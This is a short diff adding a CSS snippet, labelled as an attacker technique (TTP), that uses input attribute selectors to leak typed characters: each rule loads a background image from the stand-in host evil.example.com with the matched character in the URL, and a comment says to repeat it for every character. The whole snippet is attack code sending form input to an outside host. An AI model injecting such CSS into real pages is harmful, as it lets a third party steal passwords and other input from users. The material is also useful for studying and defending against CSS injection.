@@ -1,0 +1,9 @@
+/* TTP: Using attribute selectors to exfil typed characters in older browsers or specific setups. */
+
+input[value^="a"] {
+    background: url("https://evil.example.com/exfil?char=a");
+  }
+  input[value^="b"] {
+    background: url("https://evil.example.com/exfil?char=b");
+  }
+  /* ... etc. for each character ... */
